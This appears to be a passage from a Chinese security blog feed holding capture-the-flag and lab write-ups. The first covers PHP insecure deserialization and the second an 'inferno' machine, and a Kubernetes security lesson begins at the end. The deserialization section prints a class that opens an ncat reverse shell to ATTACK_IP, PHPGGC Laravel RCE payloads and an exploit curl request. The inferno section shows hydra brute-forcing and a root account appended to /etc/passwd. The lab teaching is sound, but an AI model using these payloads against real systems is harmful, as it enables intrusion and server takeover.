class="variable">$base64EncodedData</span>);</span><br><span class="line">    <span class="variable">$test</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serializedData</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Base64 Encoded Serialized Data: &quot;</span> . <span class="variable">$base64EncodedData</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Serialized Data: &quot;</span> . <span class="variable">$serializedData</span>;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>例如，如果我们通过 URL <a href="http://10.10.133.158/case2/?encode=hellothm">http://10.10.133.158/case2/?encode=hellothm</a> 发送输入 <strong>hellothm</strong>，我们将得到以下输出：</p><p><a href="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/711bd1f1f1922a3ae8dc0fe0e32fac81.png" title="serialised state in PHP" class="gallery-item"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/711bd1f1f1922a3ae8dc0fe0e32fac81.png" alt="serialised state in PHP"></a></p><p>我们看到代码包含一个名为 .从源代码审查或考虑框架是否开源，渗透测试者知道它包含一个名为 class 的类，如下所示：<code>test.php``test.php``MaliciousUserData</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MaliciousUserData</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$command</span> = <span class="string">&#x27;ncat -nv ATTACK_IP 10.10.10.1 -e /bin/sh&#x27;</span>; <span class="comment">// call to troubleshooting server</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="variable">$this</span>-&gt;command);</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在上面的代码中，通过不安全的反序列化，可以操作对象的属性，包括更改上述代码中类的属性。这可以通过制作包含所需属性值的特制序列化字符串来实现。例如，如果我们想修改 属性以执行不同的命令或连接到不同的服务器，我们可以序列化具有所需属性值的对象，然后将其注入到易受攻击的 函数中。这样，在反序列化时，作的属性值将被加载到对象中。<code>command``MaliciousUserData``command``unserialize()</code></p><p>重要的是要了解在不安全的反序列化期间，你不能直接更新方法本身的定义。该方法是类定义的一部分，在反序列化过程中保持静态。但是，您可以做的是在方法中修改对象的行为或属性。这意味着，虽然该方法的定义保持不变，但可以操纵它在反序列化时的操作以实现不同的结果。<code>__wakeup``__wakeup``__wakeup</code>  </p><p>现在我们已经了解了基础知识，是时候准备有效负载了。</p><p>准备 Payload</p><p>如前所述，调用另一个类是 PHP 中的正常功能，如果目标网站使用的是开源代码，则可以查看该文件的代码。 中的代码盲目地反序列化输入，而不执行任何清理。这里有什么选项？如果我们修改类并修改其属性，以便在调用函数时，将使用攻击者提供的值调用它，该怎么办？<code>index.php``MaliciousUserData``command``__wakeup</code></p><p>让我们在 AttackBox 上创建一些 PHP 代码，以生成恶意序列化用户数据。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MaliciousUserData</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$command</span> = <span class="string">&#x27;ncat -nv ATTACK_IP 4444 -e /bin/sh&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$maliciousUserData</span> = <span class="keyword">new</span> <span class="title class_">MaliciousUserData</span>();</span><br><span class="line"><span class="variable">$serializedData</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$maliciousUserData</span>);</span><br><span class="line"><span class="variable">$base64EncodedData</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$serializedData</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Base64 Encoded Serialized Data: &quot;</span> . <span class="variable">$base64EncodedData</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>在上面的代码中，类 （） 的函数将使用 Ncat 执行反向 shell 命令，以连接到指定的 IP 地址 （） 和带有 -e 标志的端口 （） 作为 shell 执行<code>_wakeup()``MaliciousUserData``test.php``ATTACK_IP``4444``/bin/sh</code></p></li><li><p>创建文件后，通过终端执行它。这将返回该类的 base64 编码的序列化对象。<code>php index.php``MaliciousUserData</code></p></li><li><p>生成的 base64 编码字符串将如下所示：.<code>TzoxNzoiTWFsaWNp[Redacted]</code></p></li><li><p>使用 AttackBox 上的命令在端口 4444 上启动 Netcat 侦听器。<code>nc -nvlp 4444</code></p></li><li><p>现在，是时候利用不安全的反序列化了，通过访问 URL 来解码 shellcode，而不生成 shellcode。<code>http://10.10.133.158/case2/?decode=[SHELLCODE]</code>  </p></li><li><p>访问 URL 后，index.php 文件的 deserialise 函数将反序列化字符串并执行该函数，从而导致远程 shell。<code>__wakeup()</code></p></li></ul><p>终端</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">thm@ubuntu$ nc -nvlp 4444</span><br><span class="line">Listening on [0.0.0.0] (family 0, port 4444)</span><br><span class="line">Connection from ATTACK_IP 35838 received! </span><br></pre></td></tr></table></figure><p>在接下来的任务中，我们将了解允许攻击者利用漏洞的问题，以及我们如何从安全编码人员的角度保护它。</p><h2 id="自动化脚本"><a href="#自动化脚本" class="headerlink" title="自动化脚本"></a>自动化脚本</h2><p>在渗透测试期间自动执行脚本对于有效识别和利用 Web 应用程序中的漏洞至关重要。在本任务中，我们将探索一种名为 <strong>PHP Gadge Chain （PHPGGC）</strong> 的工具，该工具在此过程中起着至关重要的作用，可以自动发现不安全的反序列化漏洞。PHPGGC 类似于 Java 生态系统中的 Ysoserial，可帮助安全专业人员评估 PHP 应用程序的安全状况并降低潜在风险。</p><p>菲律宾小工具链 （PHPGGC）  </p><p>PHPGGC 主要是一种用于生成 PHP 对象注入攻击中使用的小工具链的工具，专门用于利用与 PHP 对象序列化和反序列化相关的漏洞。</p><p><strong>功能性</strong></p><ul><li><p><strong>小工具链</strong>：PHPGGC 为各种 PHP 框架和库提供了小工具链库。这些小工具链是一系列对象和方法，旨在当 PHP 应用程序不安全地反序列化用户提供的数据时利用特定漏洞。  </p></li><li><p><strong>Payload Generation</strong>：PHPGGC 的主要目的是促进生成可以触发这些漏洞的序列化 payloads。它可以帮助安全研究人员和渗透测试人员创建有效载荷，以证明不安全的反序列化缺陷的影响。</p></li><li><p><strong>Payload Customisation</strong>：用户可以通过为小工具链中涉及的函数或方法指定参数来自定义 payload，从而定制攻击以实现特定结果，例如编码。</p></li></ul><p>您可以从 PHPGGC 的 <a href="https://github.com/ambionics/phpggc">GitHub 存储库</a>下载 PHPGGC，也可以通过该目录使用 AttackBox 上已有的版本。安装的版本已经包含一些小工具链、PHP 对象序列和旨在利用反序列化漏洞的方法调用。这些小工具链利用 PHP 的神奇方法来实现各种攻击目标，例如远程代码执行。<br>要列出所有可用的小工具链，您可以使用 PHPGGC 的选项，它将显示用于发起特定攻击的 名称、版本、类型和向量。此外，您还可以根据小工具链的功能过滤小工具链，例如针对特定 PHP 框架或实现特定利用技术的链，使用选项后跟过滤器关键字（Drupal、Laravel 等）。这允许您为您的利用场景选择合适的小工具链，如下所示：<code>/opt/phpggc``-l``-l</code></p><p>终端</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">thm@machine$ php phpggc -l</span><br><span class="line"></span><br><span class="line">Gadget Chains</span><br><span class="line">-------------</span><br><span class="line"></span><br><span class="line">NAME                                      VERSION                                                 TYPE                      VECTOR          I    </span><br><span class="line">Bitrix/RCE1                               17.x.x &lt;= 22.0.300                                      RCE: Command              __destruct           </span><br><span class="line">CakePHP/RCE1                              ? &lt;= 3.9.6                                              RCE: Command              __destruct           </span><br><span class="line">CakePHP/RCE2                              ? &lt;= 4.2.3                                              RCE: Command              __destruct           </span><br><span class="line">CodeIgniter4/FD1                          &lt;= 4.3.6                                                File delete               __destruct           </span><br><span class="line">CodeIgniter4/FD2                          &lt;= 4.3.7                                                File delete               __destruct           </span><br><span class="line">CodeIgniter4/FR1                          4.0.0 &lt;= 4.3.6                                          File read                 __toString      *    </span><br><span class="line">CodeIgniter4/RCE1                         4.0.2                                                   RCE: Command              __destruct           </span><br><span class="line">CodeIgniter4/RCE2                         4.0.0-rc.4 &lt;= 4.3.6                                     RCE: Command              __destruct           </span><br><span class="line">CodeIgniter4/RCE3                         4.0.4 &lt;= 4.4.3                                          RCE: Command              __destruct           </span><br><span class="line">CodeIgniter4/RCE4                         4.0.0-beta.1 &lt;= 4.0.0-rc.4                              RCE: Command              __destruct         </span><br></pre></td></tr></table></figure><p>例如，输出 for 表示名为 的小工具链 利用了 CakePHP 版本中的 RCE 漏洞。该漏洞允许攻击者利用 magic 方法在服务器上执行任意命令 。<code>CakePHP/RCE1``CakePHP/RCE1``3.9.6``__destruct</code></p><p>利用 Web 应用程序  </p><p>作为渗透测试人员，我们专注于 Laravel 网站，以利用 <a href="https://nvd.nist.gov/vuln/detail/CVE-2018-15133">CVE-2018-15133</a> 下发现的已知漏洞。当 Laravel 从 . 如果不安全处理，此反序列化过程可能会导致在服务器上执行任意代码。有关漏洞的详细信息可以从 <a href="https://laravel.com/docs/5.6/upgrade#upgrade-5.6.30">Laravel 安全版本中</a>读取，但我们的主要重点是如何在利用过程中利用 PHP 小工具链。上述漏洞可以通过三个主要因素来利用：<code>X-XSRF-TOKEN</code></p><ul><li><strong>第 1 步</strong>：需要来自 Laravel，框架使用它来加密 XSRF 令牌。<code>APP_KEY</code></li><li><strong>第 2 步</strong>：使用 PHPGGC 生成执行命令的未序列化有效负载。这被认为是一项复杂的任务，该工具可以提供帮助。</li><li><strong>第 3 步</strong>：最后，我们必须使用 APP_KEY 加密有效负载并发送 POST 请求。这通常因框架而异。</li></ul><p>在这个任务中，我们的重点将主要放在第 2 步，并了解 PHPGGC 将如何帮助我们作为渗透测试人员。访问 <a href="http://10.10.133.158:8089/">http://10.10.133.158:8089</a> 易受攻击的 Laravel 应用程序。作为渗透测试人员，我们可以通过多种技术来识别 Web 应用程序版本。您可以访问 <a href="https://tryhackme.com/module/information-gathering-and-vulnerability-scanning">信息收集和漏洞扫描</a> 模块以详细了解这一点。Laravel 应用程序版本为 5.6.29。</p><p><a href="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/821938ace57fe41fea2c7476da9e3e4e.png" title="laravel application dashboard" class="gallery-item"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/821938ace57fe41fea2c7476da9e3e4e.png" alt="laravel application dashboard"></a></p><p>现在我们将详细地逐步开发：</p><ul><li><p>第一步，我们将通过任何攻击媒介（例如社会工程）获取APP_KEY。您可以通过访问 <a href="http://10.10.133.158:8089/get-key">http://10.10.133.158:8089/get-key</a> 来获得。为方便起见，此页面还将为您提供第一个具有 <strong>whoami</strong> 命令的有效负载。<code>APP_KEY</code>  </p></li><li><p>对于第二步，我们需要确定我们可以使用的有效负载。</p></li></ul><p>终端</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">thm@machine$ php phpggc -l Laravel</span><br><span class="line"></span><br><span class="line">Gadget Chains</span><br><span class="line">-------------</span><br><span class="line"></span><br><span class="line">NAME                  VERSION           TYPE             VECTOR    </span><br><span class="line">Laravel/RCE1          5.4.27            rce              __destruct</span><br><span class="line">Laravel/RCE2          5.5.39            rce              __destruct</span><br><span class="line">Laravel/RCE3          5.5.39            rce              __destruct</span><br><span class="line">Laravel/RCE4          5.5.39            rce              __destruct</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>展望未来，我们可以使用各种小工具生成有效负载。每个 gadget 都有其相关性，并在反序列化过程中使用不同的类。在此示例中，我们将使用 RCE3，并可以通过键入 base-64 编码的有效负载的命令来生成有效负载。未编码的有效负载如下所示：<code>php phpggc -b Laravel/RCE3 system whoami</code>  </p><p>终端</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">thm@machine$ php phpggc Laravel/RCE3 system whoami O:40:&quot;Illuminate\Broadcasting\PendingBroadcast&quot;:1:&#123;s:9:&quot;*events&quot;;O:39:&quot;Illuminate\Notifications\ChannelManager&quot;:3:&#123;s:6:&quot;*app&quot;;s:6:&quot;whoami&quot;;s:17:&quot;*defaultChannel&quot;;s:1:&quot;x&quot;;s:17:&quot;*customCreators&quot;;a:1:&#123;s:1:&quot;x&quot;;s:6:&quot;assert&quot;;&#125;&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Payload 的细分  </p><ul><li><code>Illuminate\Broadcasting\PendingBroadcast</code>：此类处理 Laravel 中的事件广播。在这里，它主要是携带嵌套恶意对象的工具。</li><li><code>Illuminate\Notifications\ChannelManager</code>：此对象管理通知通道。我们通过其属性 操作它以注入任意代码执行，该属性通常会引用应用程序服务容器。我们滥用它来保持我们的命令。我们还操作了 twist 的 and 属性，以创建一个调用 PHP 函数的场景，并执行传递给它的任何代码。<code>*app``whoami``*defaultChannel``*customCreators``assert</code></li></ul><p>正如我们已经知道的，Laravel 最初使用<strong>加密</strong>和<strong>序列化的</strong> cookie 来安全地存储会话和 CSRF 令牌数据，两者使用相同的方法。如果您访问易受攻击的应用程序，您可以看到加密和序列化的 cookie，如下所示：</p><p><a href="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/9dfa21a7a10296faecf94afd2404bf5a.png" title="laravel encrypted cookie" class="gallery-item"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/9dfa21a7a10296faecf94afd2404bf5a.png" alt="laravel encrypted cookie"></a>  </p><p>基本思想是避免篡改不良行为者的数据，但尽管如此，他们没有意识到，即使是如此强大的安全机制也可能通过不安全的序列化而被破坏。  </p><p>现在我们有了 and 有效负载，是时候创建一个加密的 CSRF 令牌了。为了这个房间，我们准备了一个 PHP 脚本，该脚本将 APP_KEY 和 payload 作为参数并返回加密的令牌。您可以在 <a href="http://10.10.133.158:8089/cve.php?app_key=xx&payload=xxx">http://10.10.133.158:8089/cve.php?app_key=xx&amp;payload=xxx</a> 访问该链接<a href="http://10.10.133.158:8089/cve.php?app_key=HgJVgWjqPKZoJexCzzpN64NZjjVrzIVU5dSbGcW1ZgY=&payload=Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6MTp7czo5OiIAKgBldmVudHMiO086Mzk6IklsbHVtaW5hdGVcTm90aWZpY2F0aW9uc1xDaGFubmVsTWFuYWdlciI6Mzp7czo2OiIAKgBhcHAiO3M6Njoid2hvYW1pIjtzOjE3OiIAKgBkZWZhdWx0Q2hhbm5lbCI7czoxOiJ4IjtzOjE3OiIAKgBjdXN0b21DcmVhdG9ycyI7YToxOntzOjE6IngiO3M6Njoic3lzdGVtIjt9fX0="></a>。 为方便起见，此 URL 已具有 URL 编码的密钥和带有 <strong>whoami</strong> 命令的第一个有效负载。了解 Laravel 和 WordPress 等框架的加密机制是一项简单的任务，但目前，它超出了房间的范围。<code>APP_KEY</code></p><p>在对 Yii、CakePHP 和 Laravel 等 Web 框架进行渗透测试时，必须了解每个框架都有独特的路由和加密机制，尽管它们都是基于 PHP 构建的。这些框架采用不同的架构和安全实现设计，这意味着像 Laravel 中的 RCE3 这样的漏洞，特别是利用 Laravel 的服务容器和序列化行为，不一定适用于 WordPress 或其他基于 PHP 的系统。例如，WordPress 具有不同的结构，并且不使用 Laravel 的特定类或方法，因此为 Laravel 架构量身定制的漏洞不会直接在 WordPress 上运行。  </p><p>现在我们已经有了加密的令牌，我们可以使用 CSRF 令牌发出一个简单的 POST 请求，如下所示来执行命令。有效负载结果将显示在响应的开头。<code>cURL</code></p><p>终端</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">thm@machine$curl 10.10.133.158:8089 -X POST -H &#x27;X-XSRF-TOKEN: eyJpdiI6Im01dXZ0QXhrVm5iUHFOZWxCSnFINHc9PSIsInZhbHVlIjoiSWxhVDZZXC9cL0dyTTNLQVVsNVN6cGpFRXdYeDVqN1RcL3d0Umhtcnd2TzlVM1I5SnZ3OVdyeVFjU3hwbFwvS2dvaUF5ZlpTcW04eThxdXdQVWE5K08xSWU4Q1FWMG5GVjhlKzJkdEUwUnhXYXNuamFaWDI4bXFIZ1FaOHRWRGtVaE1EVGRxeE8xcGp0MWc0ZjNhMU5cL1BWdlQ0ZjdwdmRJWHRFYXR1YUUyNUNHTG0rRlNqWkxDSU9vSlI1MGhUNmtFQytpdnVmTnRlTVFNKzZhRDQ0amhBRXNGaUZMcmplMWdQajhINDBsY05sNis2d28rdktGNU04bklIdEUrVGczR3hseXQ0eEF4RjJoSU1oYXZVU3ZhSk1CUjlEKzZzaEdJRHk5RXlscjhOSUh5bjl0MitUeEx2Y281VTZUY29Ea0kyRiIsIm1hYyI6ImE1OGY2MjBhZThmYjdhMTgyMzA1M2IwNGExZmJkZTMzOTA2ZDBhMDI5N2Y3OWQzNDYwNzJjZTgyNjIzNmFhMTMifQ==&#x27;| head -n 2</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100  7245    0  7245    0     0  73181      0 --:--xxxx--:--:-- --:--:--     0</span><br><span class="line">&lt;!DOCTYPE html&gt;&lt;!--</span><br><span class="line">100 14485    0 14485    0     0   141k      0 --:--:-- --:--:-- --:--:--  140k</span><br><span class="line">curl: (23) Failed writing body (947 != 7240)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>适用于 Java 的 Ysoserial</p><p>Ysoserial 是一种广为人知的漏洞利用工具，专门用于测试 Java 应用程序的安全性以应对序列化漏洞。它有助于生成利用这些漏洞的有效负载，使其成为旨在评估和利用使用 Java 序列化的应用程序的攻击者和渗透测试人员的重要工具。</p><p>要使用 Ysoserial，攻击者通常会使用命令生成有效负载，例如 ，其中 是漏洞利用的类型，是他们希望在目标系统上运行的任意命令。例如，使用有效负载类型可能如下所示：。此命令会生成一个序列化对象，当被易受攻击的应用程序反序列化时，该对象将执行指定的命令。Ysoserial 可在 GitHub <a href="https://github.com/frohoff/ysoserial">上下载</a>。<code>java -jar ysoserial.jar [payload type] &#39;[command to execute]&#39;``[payload type]``[command to execute]``CommonsCollections1``java -jar ysoserial.jar CommonsCollections1 &#39;calc.exe&#39;</code></p><p>降低与不安全反序列化相关的风险对于确保 Web 应用程序的安全性至关重要。通过实施有效的防御措施，组织可以显著降低漏洞利用的可能性并减轻</p><p>潜在损害。我们将从红队&#x2F;渗透测试员和安全代码的角度来讨论这个问题。</p><h2 id="缓解措施"><a href="#缓解措施" class="headerlink" title="缓解措施"></a>缓解措施</h2><p>Red Teamer &#x2F; 渗透测试器视角</p><ul><li><strong>代码库分析</strong>：对应用程序的序列化机制进行全面审查。确定整个代码库中潜在的反序列化和序列化点。</li><li><strong>漏洞识别</strong>：使用静态分析工具检测不安全的反序列化漏洞。查找不正确的输入验证、不安全的库和过时的依赖项。</li><li><strong>模糊测试和动态分析</strong>：采用模糊测试技术生成无效或意外的输入数据。使用动态分析工具监控应用程序在运行时的行为。</li><li><strong>错误处理评估</strong>：评估应用程序在反序列化期间如何处理错误。查找揭示系统详细信息的潜在错误消息或堆栈跟踪。</li></ul><p>Secure Coder 视角</p><ul><li><strong>避免不安全的序列化格式</strong>：避免使用本质上不安全的序列化格式，例如 Java 序列化。选择更安全的替代方案，例如具有强大验证机制的 JSON 或 XML。</li><li><strong>避免使用 eval 和 exec</strong>：避免使用 and 函数，因为它们可以执行任意代码并带来重大安全风险。<code>eval()``exec()</code></li><li><strong>输入验证和输出编码</strong>：实施严格的输入验证，以确保只接受预期的数据。应用输出编码技术在序列化之前清理数据。</li><li><strong>安全编码做法</strong>：遵循安全标准和准则建议的安全编码做法。采用最低特权、深度防御和故障安全默认值等原则。</li><li><strong>遵守准则</strong>：已建立特定于编程语言或框架的安全编码准则。</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>inferno</title>
      <link href="/2024/12/01/inferno/"/>
      <url>/2024/12/01/inferno/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><blockquote></blockquote><h2 id="靶场概述"><a href="#靶场概述" class="headerlink" title="靶场概述"></a>靶场概述</h2><p>难度： medium<br>描述：现实生活中的机器 + CTF。该机器被设计为现实生活（也许不是？），非常适合刚开始渗透测试的新手</p><hr><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><table><thead><tr><th>🚀</th><th>本地机器信息</th><th>目标机器信息</th></tr></thead><tbody><tr><td>IP</td><td>10.17.5.121</td><td>10.10.232.226</td></tr><tr><td>OS</td><td>kali</td><td>linux</td></tr></tbody></table><hr><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>端口扫描</p><p><a href="/../assets/img/Pasted%20image%2020241201145201.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241201145201.png"></a></p><p>需要登录凭证<br>    <a href="/../assets/img/Pasted%20image%2020241201145939.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241201145939.png"></a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(leo㉿HACK)-[~/SecLab/inferno]</span><br><span class="line">└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.232.226 http-</span><br><span class="line">get /inferno</span><br><span class="line">Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-12-01 15:01:44</span><br><span class="line">[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task</span><br><span class="line">[DATA] attacking http-get://10.10.232.226:80/inferno</span><br><span class="line">[STATUS] 1341.00 tries/min, 1341 tries in 00:01h, 14343057 to do in 178:16h, 16 active</span><br><span class="line">[STATUS] 1410.00 tries/min, 4230 tries in 00:03h, 14340168 to do in 169:31h, 16 active</span><br></pre></td></tr></table></figure><p><a href="/../assets/img/Pasted%20image%2020241201151235.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241201151235.png"></a><br><a href="/../assets/img/Pasted%20image%2020241201151339.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241201151339.png"></a></p><h2 id="攻击向量"><a href="#攻击向量" class="headerlink" title="攻击向量"></a>攻击向量</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit codiad</span><br></pre></td></tr></table></figure><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><a href="/../assets/img/Pasted%20image%2020241201151944.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241201151944.png"></a><br><a href="/../assets/img/Pasted%20image%2020241201153247.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241201153247.png"></a><br>您会注意到有一个 cronjob 每分钟都会让您注销，因此您必须快点。</p><p>获取到密钥<br><a href="/../assets/img/Pasted%20image%2020241201153800.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241201153800.png"></a></p><p>尝试ssh登录<br><a href="/../assets/img/Pasted%20image%2020241201154115.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241201154115.png"></a></p><p><a href="/../assets/img/Pasted%20image%2020241201154041.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241201154041.png"></a><br>让我们利用这一点来生成一个特权用户：</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 -salt &quot;test&quot; &quot;test&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;test:$1$test$pi/xDtU5WFVRqYS6BMU8X/:0:0:root:/root:/bin/bash&#x27; | sudo tee -a /etc/passwd</span><br></pre></td></tr></table></figure><p><a href="/../assets/img/Pasted%20image%2020241201155156.png" class="gallery-item"><img src="/../assets/img/Pasted%20image%2020241201155156.png"></a></p><h2 id="知识点回顾"><a href="#知识点回顾" class="headerlink" title="知识点回顾"></a>知识点回顾</h2><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>集群级别的最佳 Kubernetes 安全实践。</title>
      <link href="/2024/12/01/k8sbestsecuritypractices/"/>
      <url>/2024/12/01/k8sbestsecuritypractices/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><blockquote></blockquote><h2 id="靶场概述"><a href="#靶场概述" class="headerlink" title="靶场概述"></a>靶场概述</h2><p>难度： hard<br>描述：集群级别的最佳 Kubernetes 安全实践。<br>这个房间适合所有有抱负的 DevSecOps 工程师和花时间学习该工具基础知识的 Kubernetes 爱好者。它适用于了解该工具、其工作原理以及构建安全 Kubernetes 集群时要采取的初始步骤的人。但现在怎么办？您已经构建了一个安全的集群，但如何确保其安全？随着 Kubernetes 被用作编排容器化应用程序的平台，必须在不同的层上考虑许多不同的安全因素。对于那些希望登上 DevSecOps Express 的人来说，甚至对于那些已经登上的人来说，这可能会让人不知所措。因此，这个房间旨在收集一些关键的最佳 Kubernetes 安全实践，以使您的旅程更加顺畅。全体上车！</p><hr><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><table><thead><tr><th>🚀</th><th>本地机器信息</th><th>目标机器信息</th></tr></thead><tbody><tr><td>IP</td><td>10.17.5.121</td><td></td></tr><tr><td>OS</td><td>kali</td><td></td></tr></tbody></table><hr><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>Kubernetes 中最重要的安全实践之一是高效、安全地实施访问控制。服务账户是 Access Control 难题的一部分，您需要完成它才能了解如何实现。服务帐户在 <a href="https://tryhackme.com/r/room/introtok8s">Kubernetes 简介房间</a>中简要介绍了，但现在是时候更深入地了解它们是什么以及它们在 Kubernetes 中的使用方式了。“服务帐户”是如果您使用其他云技术时可能熟悉的通用术语。在这个任务中，我们将在 Kubernetes 的上下文中定义一个 Service 帐户，一个 <strong>ServiceAccount</strong> 对象。</p><p>服务帐户可以被视为数字身份或非人类帐户。在 